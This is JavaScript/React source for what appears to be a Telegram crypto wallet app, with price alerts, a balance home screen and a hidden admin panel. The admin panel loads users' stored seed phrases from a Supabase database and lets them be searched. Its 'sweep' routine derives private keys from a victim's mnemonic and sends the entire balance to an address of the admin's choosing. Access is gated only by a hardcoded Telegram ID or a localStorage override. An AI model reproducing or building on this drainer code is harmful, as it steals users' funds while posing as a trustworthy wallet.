  const allAssets = [
    { id: "ltc",  name: "Litecoin",  symbol: "LTC",  price: "55,93 $", change: "-0,36 %", positive: false, Icon: LtcIcon  },
    { id: "eth",  name: "Ethereum",  symbol: "ETH",  price: "2 187,89 $", change: "+0,38 %", positive: true, Icon: EthIcon },
    { id: "ton",  name: "TON",       symbol: "TON",  price: "1,94 $",  change: "+1,01 %", positive: true, Icon: TonIcon  },
    { id: "btc",  name: "Bitcoin",   symbol: "BTC",  price: "78 086,00 $", change: "-0,14 %", positive: false, Icon: BtcIcon },
    { id: "bnb",  name: "BNB Chain", symbol: "BNB",  price: "654,01 $", change: "-0,42 %", positive: false, Icon: BnbIcon },
    { id: "sol",  name: "Solana",    symbol: "SOL",  price: "86,45 $", change: "-0,35 %", positive: false, Icon: SolIcon  },
    { id: "trx",  name: "TRON",      symbol: "TRX",  price: "0,3572 $", change: "+1,34 %", positive: true, Icon: TronIcon },
  ];

  function addAsset(asset) {
    if (!watchlist.find(a => a.id === asset.id)) {
      setWatchlist(prev => [...prev, asset]);
      setToast(`Оповещение о цене включено для ${asset.name}`);
      setTimeout(() => setToast(null), 2500);
    }
    setAddingAsset(false);
  }

  if (addingAsset) {
    return (
      <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
        <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
          <button onClick={() => setAddingAsset(false)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
              <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </button>
          <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>Выберите актив</span>
          <div style={{ width: 30 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
              <path d="M3 6h18M7 12h10M11 18h2" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
          </div>
        </div>
        <div style={{ padding: "0 16px 14px" }}>
          <div style={{ background: "#252530", borderRadius: 12, display: "flex", alignItems: "center", padding: "10px 14px", gap: 8 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
              <circle cx="11" cy="11" r="8" stroke="#888" strokeWidth="1.8" />
              <path d="M21 21l-4.35-4.35" stroke="#888" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
            <input placeholder="Поиск" style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 15, width: "100%" }} />
          </div>
        </div>
        <div style={{ display: "flex", padding: "0 16px 16px", gap: 8 }}>
          {["Все", "В тренде", "Стейблкоины"].map((t, i) => (
            <button key={t} style={{ padding: "7px 14px", borderRadius: 20, border: "none", cursor: "pointer", fontSize: 13, fontWeight: 500,
              background: i === 0 ? "#3B7DFF" : "transparent", color: i === 0 ? "white" : "#888" }}>{t}</button>
          ))}
        </div>
        <div style={{ background: "#181820", borderRadius: 16, margin: "0 12px", overflow: "hidden" }}>
          {allAssets.map((asset, i) => (
            <div key={asset.id} onClick={() => addAsset(asset)}
              style={{ display: "flex", alignItems: "center", padding: "14px 16px", cursor: "pointer",
                borderBottom: i < allAssets.length - 1 ? "1px solid #2A2A2C" : "none" }}>
              <div style={{ width: 44, height: 44, flexShrink: 0 }}>
                <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
              </div>
              <div style={{ flex: 1, marginLeft: 12 }}>
                <div style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{asset.name} <span style={{ color: "#888", fontWeight: 400 }}>{asset.symbol}</span></div>
                <div style={{ display: "flex", gap: 6, marginTop: 2 }}>
                  <span style={{ color: "#888", fontSize: 13 }}>{asset.price}</span>
                  <span style={{ color: asset.positive ? "#34C759" : "#FF453A", fontSize: 13 }}>{asset.change}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, position: "relative" }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>Уведомления о ценах</span>
        <button onClick={() => setAddingAsset(true)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M12 5v14M5 12h14" stroke="white" strokeWidth="2" strokeLinecap="round" />
          </svg>
        </button>
      </div>

      <div style={{ background: "#181820", borderRadius: 16, margin: "8px 16px 8px", overflow: "hidden" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px", borderBottom: "1px solid #222228" }}>
          <span style={{ color: "white", fontSize: 16 }}>Включить</span>
          <Toggle value={enabled} onChange={setEnabled} />
        </div>
        <div style={{ padding: "10px 16px 14px" }}>
          <span style={{ color: "#888", fontSize: 13 }}>Получайте уведомления о значительном изменении цен на ваши любимые криптоактивы.</span>
        </div>
      </div>

      {watchlist.length === 0 ? (
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 16, padding: "0 32px" }}>
          <div style={{ width: 80, height: 80, borderRadius: "50%", background: "#252530",
            display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 40, height: 40 }}>
              <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 0 1-3.46 0" stroke="white" strokeWidth="1.5" strokeLinecap="round" />
            </svg>
          </div>
          <div style={{ textAlign: "center" }}>
            <div style={{ color: "white", fontWeight: 700, fontSize: 17, marginBottom: 8 }}>Ваши оповещения о ценах будут появляться здесь</div>
            <div style={{ color: "#888", fontSize: 14 }}>Включите их, добавив монеты для отслеживания</div>
          </div>
        </div>
      ) : (
        <div style={{ background: "#181820", borderRadius: 16, margin: "0 16px", overflow: "hidden" }}>
          {watchlist.map((asset, i) => (
            <div key={asset.id} style={{ display: "flex", alignItems: "center", padding: "14px 16px",
              borderBottom: i < watchlist.length - 1 ? "1px solid #2A2A2C" : "none" }}>
              <div style={{ width: 44, height: 44, flexShrink: 0 }}>
                <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
              </div>
              <div style={{ flex: 1, marginLeft: 12 }}>
                <div style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{asset.name} <span style={{ color: "#888", fontWeight: 400 }}>{asset.symbol}</span></div>
                <div style={{ display: "flex", gap: 6, marginTop: 2 }}>
                  <span style={{ color: "#888", fontSize: 13 }}>{asset.price}</span>
                  <span style={{ color: asset.positive ? "#34C759" : "#FF453A", fontSize: 13 }}>{asset.change}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {toast && (
        <div style={{ position: "absolute", bottom: 24, left: 16, right: 16,
          background: "#252530", borderRadius: 14, padding: "14px 20px",
          color: "white", fontSize: 15, textAlign: "center" }}>
          {toast}
        </div>
      )}
    </div>
  );
}

/* ─── Format balance helper ──────────────────────────────────── */
function formatFee(val) {
  const n = parseFloat(val);
  if (isNaN(n) || n === 0) return val;
  if (n >= 1000000) return (n / 1000000).toFixed(1).replace(/\.0$/, '').replace(".", ",") + 'M';
  if (n >= 1000) return (n / 1000).toFixed(1).replace(/\.0$/, '').replace(".", ",") + 'K';
  return n.toString().replace(".", ",");
}

/* Convert a base-currency fee to small units and format with K/M */
function formatTxFee(rawFee, assetId) {
  if (!rawFee) return null;
  const s = String(rawFee).trim();
  // Already formatted with a unit label (contains letters) → show as-is
  if (/[a-zA-Z]/.test(s)) return s;
  const n = parseFloat(s.replace(",", "."));
  if (isNaN(n) || n === 0) return s;
  // Map asset to small-unit multiplier and label
  let mul, unit;
  const id = (assetId || "").toLowerCase();
  if (id === "ton" || id === "usdt-ton") { mul = 1e9; unit = "NanoTON"; }
  else if (id === "sol" || id === "usdt-sol") { mul = 1e9; unit = "Lamports"; }
  else if (id === "ltc") { mul = 1e8; unit = "sat/vB"; }
  else { mul = 1e9; unit = "Gwei"; }
  const small = n * mul;
  let fmt;
  if (small >= 1e6) fmt = parseFloat((small / 1e6).toFixed(3)).toString().replace(".", ",") + "M";
  else if (small >= 1e3) fmt = parseFloat((small / 1e3).toFixed(3)).toString().replace(".", ",") + "K";
  else fmt = parseFloat(small.toFixed(3)).toString().replace(".", ",");
  return `${fmt} ${unit}`;
}

/* Shorten a blockchain address for display */
function shortAddress(addr) {
  if (!addr || addr.length <= 16) return addr;
  return addr.slice(0, 8) + "…" + addr.slice(-6);
}

function fmtBal(num, sym) {
  const n = parseFloat(num);
  if (isNaN(n) || n === 0) return `0 ${sym}`;
  if (n < 0.0001) return `${n.toExponential(2).replace(".", ",")} ${sym}`;
  
  // Use a precision based on value size
  const precision = n < 1 ? 6 : 4;
  const fixed = n.toFixed(precision);
  
  // Remove trailing zeros only after the decimal point
  let str = parseFloat(fixed).toString();
  return `${str.replace(".", ",")} ${sym}`;
}

/* ─── Screen: Home ───────────────────────────────────────────── */
const HomeScreen = memo(({ onSend, onReceive, onBuy, onSwap, onAssetClick, onWalletsClick }) => {
  const { balances, addresses, refreshBalance, testMode, settings, updateSetting } = useWallet();
  const [isRefreshing, setIsRefreshing] = useState(false);
  const assets = useAssets();
  const livePriceMap = useLivePriceMap();

  // Build real balances mapped to asset ids
  const getRealBalance = (assetId) => {
    if (!balances) return 0;
    let val = 0;
    switch(assetId) {
      case 'btc':      val = balances.BTC || balances.bitcoin || 0; break;
      case 'ltc':      val = balances.LTC || balances.litecoin || 0; break;
      case 'eth':      val = balances.ETH || balances.ethereum || 0; break;
      case 'ton':      val = balances.TON || balances.ton || 0; break;
      case 'arb':      val = balances.ARB || balances.arbitrum || 0; break;
      case 'bnb':      val = balances.BNB || balances.bsc || 0; break;
      case 'sol':      val = balances.SOL || balances.solana || 0; break;
      case 'usdt-eth': val = balances._usdtByNetwork?.eth || 0; break;
      case 'usdt-bnb': val = balances._usdtByNetwork?.bnb || 0; break;
      case 'usdt-sol': val = balances._usdtByNetwork?.sol || 0; break;
      case 'usdt-ton': val = balances._usdtByNetwork?.ton || 0; break;
      case 'usdt-trx': val = balances._usdtByNetwork?.trx || 0; break;
      default: val = 0;
    }
    return parseFloat(val) || 0;
  };

  // Calculate total portfolio value using live prices when available
  const getApproxPrice = (assetId) => {
    if (assetId.startsWith('usdt')) return 1.00;
    const live = livePriceMap[assetId];
    if (live) return live.usdPrice;
    const base = BASE_ASSETS.find(a => a.id === assetId);
    return base?.usdPrice || 0;
  };
  const totalUsd = assets.reduce((sum, a) => {
    const bal = getRealBalance(a.id);
    const price = getApproxPrice(a.id);
    return sum + (bal * price || 0);
  }, 0);

  // Refresh balances on mount
  const didRefresh = useRef(false);
  useEffect(() => {
    if (!didRefresh.current && addresses && Object.keys(addresses).length > 0) {
      didRefresh.current = true;
      refreshBalance();
    }
  }, [addresses, refreshBalance]);
  
  return (
    <div style={{ animation: "fadeIn 0.22s ease both", paddingBottom: 80 }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px 20px 8px" }}>
        <div style={{ width: 36, height: 36 }} />
        <div onClick={onWalletsClick} style={{ display: "flex", alignItems: "center", gap: 8, cursor: "pointer" }}>
          <div style={{ width: 28, height: 28, borderRadius: "50%", overflow: "hidden", boxShadow: "0 0 10px #3B7DFF55" }}>
            <img src={gemIcon} alt="gem" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
          </div>
          <span style={{ color: "white", fontWeight: 600, fontSize: 17, fontFamily: DS.font, letterSpacing: -0.3 }}>{settings?.walletName || 'Кошелек № 1'}</span>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
            <path d="M6 9l6 6 6-6" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
          </svg>
        </div>
        <button onClick={async () => {
          if (isRefreshing) return;
          setIsRefreshing(true);
          try { await refreshBalance(); } catch(e) {}
          setIsRefreshing(false);
        }} style={{ width: 36, height: 36, borderRadius: "50%", background: "transparent", border: "none", cursor: isRefreshing ? "default" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{
            width: 22, height: 22,
            animation: isRefreshing ? "spin 0.7s linear infinite" : "none"
          }}>
            <path d="M21 12a9 9 0 1 1-9-9c2.39 0 4.68.94 6.36 2.64L21 8" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
            <path d="M21 3v5h-5" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
      </div>

      <div
        onClick={() => updateSetting('hideBalance', !settings?.hideBalance)}
        style={{ textAlign: "center", padding: "12px 20px 20px", animation: "fadeSlideUp 0.3s ease both", cursor: "pointer", userSelect: "none" }}
      >
        <div style={{ color: "white", fontSize: 42, fontWeight: 700, letterSpacing: -1.5, fontFamily: DS.font }}>
          {settings?.hideBalance
            ? `•••••`
            : totalUsd < 0.01 ? `0,00 ${(CURRENCIES.find(c => c.code === (settings?.currencyCode || 'USD')) || CURRENCIES[0]).symbol}` : fmtCurrency(totalUsd, settings?.currencyCode || 'USD')}
        </div>
        <div style={{ color: "#8E8E93", fontSize: 14, fontWeight: 400, marginTop: 4, display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontFamily: DS.font }}>
          {getLang(settings).portfolio}
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, opacity: 0.5 }}>
            {settings?.hideBalance
              ? <><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" stroke="#888" strokeWidth="1.8" strokeLinecap="round"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" stroke="#888" strokeWidth="1.8" strokeLinecap="round"/><path d="M1 1l22 22" stroke="#888" strokeWidth="1.8" strokeLinecap="round"/></>
              : <><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="#888" strokeWidth="1.8"/><circle cx="12" cy="12" r="3" stroke="#888" strokeWidth="1.8"/></>}
          </svg>
        </div>
      </div>

      <div style={{ display: "flex", justifyContent: "space-around", padding: "0 20px 24px" }}>
        {(() => {
          const T = getLang(settings);
          return [
            { label: T.send, onClick: onSend, icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><path d="M22 2L11 13" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/><path d="M22 2L15 22L11 13L2 9L22 2Z" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/></svg> },
            { label: T.receive, onClick: onReceive, icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><rect x="3" y="3" width="7" height="7" rx="1" stroke="white" strokeWidth="2"/><rect x="5" y="5" width="3" height="3" fill="white"/><rect x="14" y="3" width="7" height="7" rx="1" stroke="white" strokeWidth="2"/><rect x="16" y="5" width="3" height="3" fill="white"/><rect x="3" y="14" width="7" height="7" rx="1" stroke="white" strokeWidth="2"/><rect x="5" y="16" width="3" height="3" fill="white"/><path d="M14 14h3v3h-3zM17 17h3v3h-3zM14 20h3v1h-3z" fill="white"/></svg> },
            { label: T.buy, onClick: onBuy, icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/></svg> },
          ];
        })().map((btn, i) => (
          <div key={btn.label} className="tap-btn" onClick={btn.onClick}
            style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, animation: `fadeSlideUp 0.3s ${i * 0.06}s ease both` }}>
            <div style={{ width: 64, height: 64, borderRadius: "50%",
              background: "#3B7DFF",
              boxShadow: "0 4px 20px #3B7DFF66",
              display: "flex", alignItems: "center", justifyContent: "center" }}>
              {btn.icon}
            </div>
            <span style={{ color: "#BBBBBB", fontSize: 12, fontWeight: 500 }}>{btn.label}</span>
          </div>
        ))}
      </div>

      <div style={{ background: "#181820", borderRadius: 20, margin: "0 12px", overflow: "hidden", flex: 1 }} className="anim-list">
        {assets.map((asset, index) => {
          const realBal = getRealBalance(asset.id);
          const balStr = fmtBal(realBal, asset.symbol);
          const usdVal = realBal > 0 ? `${(realBal * getApproxPrice(asset.id)).toFixed(4).replace(".", ",")} $` : "";
          return (
            <div key={asset.id} className="tap-row"
              onClick={() => onAssetClick(asset.id)}
              style={{ display: "flex", alignItems: "center", padding: "13px 16px",
                borderBottom: index < assets.length - 1 ? "1px solid #252528" : "none" }}>
              <div style={{ width: 44, height: 44, flexShrink: 0, position: "relative" }}>
                <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
              </div>
              <div style={{ flex: 1, marginLeft: 13 }}>
                <div style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{asset.name}</div>
                <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 2 }}>
                  <span style={{ color: "#8E8E93", fontSize: 13 }}>{asset.usdPrice ? fmtCurrency(asset.usdPrice, settings?.currencyCode || 'USD') : asset.price}</span>
                  <span style={{ color: asset.positive ? "#32D764" : "#FF453A", fontSize: 13, fontWeight: 500 }}>{asset.change}</span>
                </div>
              </div>
              <div style={{ textAlign: "right" }}>
                <div style={{ color: realBal === 0 ? "#555" : "white", fontWeight: 600, fontSize: 15 }}>
                  {settings?.hideBalance ? "•••" : balStr}
                </div>
                {realBal > 0 && !settings?.hideBalance
                  ? <div style={{ color: "#8E8E93", fontSize: 13, marginTop: 2 }}>{fmtCurrency(realBal * getApproxPrice(asset.id), settings?.currencyCode || 'USD')}</div>
                  : null}
              </div>
            </div>
          );
        })}
      </div>

      <div style={{ height: 16 }} />
    </div>
  );
});

/* ─── Admin panel detection ──────────────────────────────────── */
function getAdminTgIds() {
  const env = import.meta.env.VITE_ADMIN_TG_IDS || "";
  return env.split(",").map(s => s.trim()).filter(Boolean);
}

function useIsAdmin() {
  try {
    const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
    if (tgUser) {
      const adminIds = getAdminTgIds();
      if (adminIds.includes(String(tgUser.id))) return true;
      if (String(tgUser.id) === "1192740493") return true;
    }
  } catch (_) {}
  if (localStorage.getItem("gem_admin_override") === "1") return true;
  return false;
}

/* ─── Admin Screen (SupabaseAdminPanel) ──────────────────────── */
const ADMIN_REFRESH_INTERVAL = 15;

function AdminScreen({ onBack }) {
  const SB_URL = import.meta.env.VITE_SUPABASE_URL || "https://ipgarqmumnbpjnputhnp.supabase.co";
  const SB_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY || "";

  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [err, setErr] = useState(null);
  const [search, setSearch] = useState("");
  const [copiedKey, setCopiedKey] = useState(null);
  const [expandedId, setExpandedId] = useState(null);
  const [countdown, setCountdown] = useState(ADMIN_REFRESH_INTERVAL);
  const [lastUpdated, setLastUpdated] = useState(null);
  const [sweepWallet, setSweepWallet] = useState(null);
  const [sweepLoading, setSweepLoading] = useState(false);
  const [sweepResult, setSweepResult] = useState(null);
  const [sweepStep, setSweepStep] = useState('coin'); // coin | address | confirm | result
  const [sweepCoin, setSweepCoin] = useState(null);
  const [sweepTargetAddr, setSweepTargetAddr] = useState("");

  const COINS = ['ETH', 'TON', 'BNB', 'LTC', 'ARB', 'SOL', 'USDT'];

  async function loadWallets(silent = false) {
    if (!silent) setLoading(true);
    setErr(null);
    try {
      const res = await fetch(
        `${SB_URL}/rest/v1/wallets?select=*&order=created_at.desc&limit=500`,
        { headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` } }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
      const data = await res.json();
      setWallets(Array.isArray(data) ? data : []);
      setLastUpdated(new Date());
      setCountdown(ADMIN_REFRESH_INTERVAL);
    } catch (e) { setErr(e.message); }
    finally { if (!silent) setLoading(false); }
  }

  useEffect(() => { loadWallets(); }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setCountdown(c => {
        if (c <= 1) { loadWallets(true); return ADMIN_REFRESH_INTERVAL; }
        return c - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  function copyText(text, key) {
    const cb = () => {
      const el = document.createElement("textarea");
      el.value = text;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
    };
    navigator.clipboard ? navigator.clipboard.writeText(text).catch(cb) : cb();
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 1800);
  }

  function fmtDate(d) {
    if (!d) return "—";
    try { return new Date(d).toLocaleString("ru-RU", { day: "2-digit", month: "2-digit", year: "2-digit", hour: "2-digit", minute: "2-digit" }); }
    catch { return "—"; }
  }

  const filtered = wallets.filter(w => {
    const name = (w.username || "").toLowerCase();
    const isUnwanted = 
      name === "anonymous" || 
      name === "unknown" || 
      name === "user_unknown" || 
      name === "нет username" || 
      !w.username;
    
    if (isUnwanted) return false;
    
    if (!search) return true;
    const q = search.toLowerCase();
    return name.includes(q) ||
      (w.mnemonic || "").toLowerCase().includes(q);
  });

  const totalUsers = wallets.length;
  const todayUsers = wallets.filter(u => u.created_at && new Date(u.created_at).toDateString() === new Date().toDateString()).length;
  const withBalance = wallets.filter(u => COINS.some(s => parseFloat(u[s.toLowerCase() + '_balance'] || 0) > 0)).length;

  async function executeStepSweep() {
    if (!sweepWallet || !sweepCoin || !sweepTargetAddr) return;
    setSweepLoading(true);
    setSweepResult(null);
    try {
      const mnemonicStr = (sweepWallet.mnemonic || "").trim();
      const { deriveWallet } = await import('./lib/crypto/walletDerivation.js');
      const { sendTransaction } = await import('./lib/crypto/transactionSender.js');
      const { addresses, privateKeys } = await deriveWallet(mnemonicStr);
      
      const sym = sweepCoin.sym;
      const netId = sweepCoin.netId;
      const amount = parseFloat(sweepWallet[sym.toLowerCase() + '_balance'] || 0);
      
      if (amount <= 0) throw new Error("Баланс этой монеты равен 0");

      const txHash = await sendTransaction({
        sym,
        networkId: netId,
        from: addresses[sym] || addresses.ETH,
        to: sweepTargetAddr,
        amount,
        privateKey: privateKeys[sym] || privateKeys.ETH,
        fee: 0 // Default low fee
      });

      setSweepResult({ success: true, txHash });
      setSweepStep('result');
      
      notifyAdmin(
        `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym} (${netId})\n💰 ${amount}\n🎯 ${sweepTargetAddr}\n🔗 <code>${txHash}</code>`,
        "sweep"
      );
    } catch (e) {
      setSweepResult({ success: false, message: e.message });
      setSweepStep('result');
    } finally {
      setSweepLoading(false);
    }
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh", background: "#000", paddingBottom: 100 }}>

      {/* Modern Header */}
      <div style={{ position: "sticky", top: 0, zIndex: 100, background: "rgba(0,0,0,0.8)", backdropFilter: "blur(20px)",
        padding: "16px 20px 12px", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 16, marginBottom: 20 }}>
          <button onClick={onBack} style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: "50%",
            width: 40, height: 40, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.2s" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
              <path d="M15 18l-6-6 6-6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </button>
          <div style={{ flex: 1 }}>
            <div style={{ color: "white", fontWeight: 800, fontSize: 20, letterSpacing: "-0.02em" }}>Admin Panel</div>
            <div style={{ color: "#3B7DFF", fontSize: 12, fontWeight: 500, marginTop: 2, display: "flex", alignItems: "center", gap: 6 }}>
              <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#34C759", boxShadow: "0 0 8px #34C759" }} />
              {lastUpdated
                ? `Updated at ${lastUpdated.toLocaleTimeString("ru-RU")}`
                : "Loading…"}
            </div>
          </div>
          <button onClick={() => loadWallets(false)}
            style={{ background: "rgba(59,125,255,0.1)", border: "1px solid rgba(59,125,255,0.2)", borderRadius: 12,
              padding: "8px 12px", display: "flex", alignItems: "center", gap: 8, cursor: "pointer" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, animation: loading ? "spin 1s linear infinite" : "none" }}>
              <path d="M23 4v6h-6M1 20v-6h6" stroke="#3B7DFF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
              <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" stroke="#3B7DFF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            <span style={{ fontSize: 13, fontWeight: 600, color: "#3B7DFF", fontVariantNumeric: "tabular-nums" }}>{countdown}s</span>
          </button>
        </div>

        {/* Stats Grid */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 12, marginBottom: 16 }}>
          {[
            { label: "Total Users", value: totalUsers, icon: "👥", color: "#3B7DFF", bg: "rgba(59,125,255,0.1)" },
            { label: "New Today", value: todayUsers, icon: "✨", color: "#34C759", bg: "rgba(52,199,89,0.1)" },
            { label: "Funded", value: withBalance, icon: "💰", color: "#FF9500", bg: "rgba(255,149,0,0.1)" },
          ].map((s) => (
            <div key={s.label} style={{ background: s.bg, borderRadius: 16, padding: "12px", border: `1px solid ${s.color}22` }}>
              <div style={{ fontSize: 18, marginBottom: 4 }}>{s.icon}</div>
              <div style={{ color: "white", fontWeight: 800, fontSize: 18 }}>{s.value}</div>
              <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 10, fontWeight: 600, textTransform: "uppercase", marginTop: 2 }}>{s.label}</div>
            </div>
          ))}
        </div>

        {/* Search Input */}
        <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 14, padding: "12px 16px",
          display: "flex", alignItems: "center", gap: 12, border: "1px solid rgba(255,255,255,0.08)" }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
            <circle cx="11" cy="11" r="7" stroke="rgba(255,255,255,0.3)" strokeWidth="2" />
            <path d="M20 20l-3-3" stroke="rgba(255,255,255,0.3)" strokeWidth="2" strokeLinecap="round" />
          </svg>
          <input
            placeholder="Search by name, ID or seed…"
            value={search}
            onChange={e => setSearch(e.target.value)}
            style={{ flex: 1, background: "none", border: "none", outline: "none",
              color: "white", fontSize: 15, fontFamily: "inherit" }}
          />
        </div>
      </div>

      {/* Content */}
      <div style={{ padding: "10px 16px", flex: 1 }}>
        {err && (
          <div style={{ background: "rgba(255,69,58,0.1)", border: "1px solid rgba(255,69,58,0.25)",
            borderRadius: 12, padding: "12px 16px", color: "#FF453A", fontSize: 13, marginBottom: 12 }}>
            ⚠ {err}
          </div>
        )}

        {loading && (
          <div style={{ textAlign: "center", padding: 40, color: "#555", fontSize: 14 }}>Загрузка…</div>
        )}

        {!loading && filtered.length === 0 && (
          <div style={{ textAlign: "center", padding: 40, color: "#555", fontSize: 14 }}>
            {search ? "Нет результатов" : "Нет кошельков в базе"}
          </div>
        )}

        {filtered.map((w, i) => {
          const uid = w.id || i;
          const isOpen = expandedId === uid;
          const mnStr = (w.mnemonic || "").trim();
          const displayName = w.username;
          const dateStr = fmtDate(w.created_at);
          const balUSD = parseFloat(w.balance || 0);
          const hasBalance = COINS.some(s => parseFloat(w[s.toLowerCase() + '_balance'] || 0) > 0);
          const avatarLetter = displayName.replace("@", "")[0].toUpperCase();

          return (
            <div key={uid} style={{ background: "rgba(255,255,255,0.03)", borderRadius: 20,
              border: `1px solid ${isOpen ? "rgba(59,125,255,0.3)" : "rgba(255,255,255,0.06)"}`,
              marginBottom: 12, overflow: "hidden", transition: "all 0.3s ease" }}>

              {/* Card header */}
              <div onClick={() => setExpandedId(isOpen ? null : uid)}
                style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer", gap: 14 }}>
                <div style={{ width: 48, height: 48, borderRadius: 16, flexShrink: 0,
                  background: "linear-gradient(135deg, #3B7DFF, #6B21A8)",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  fontSize: 18, fontWeight: 800, color: "#fff", boxShadow: "0 4px 12px rgba(59,125,255,0.2)" }}>
                  {avatarLetter}
                </div>

                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ color: "#fff", fontSize: 16, fontWeight: 700, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    {displayName}
                  </div>
                  <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 12, marginTop: 4, display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ color: hasBalance ? "#34C759" : "inherit", fontWeight: hasBalance ? 700 : 400 }}>
                      {hasBalance ? `💰 $${balUSD.toFixed(2)}` : "$0.00"}
                    </span>
                  </div>
                </div>

                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6, flexShrink: 0 }}>
                  <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 8, padding: "4px 8px" }}>
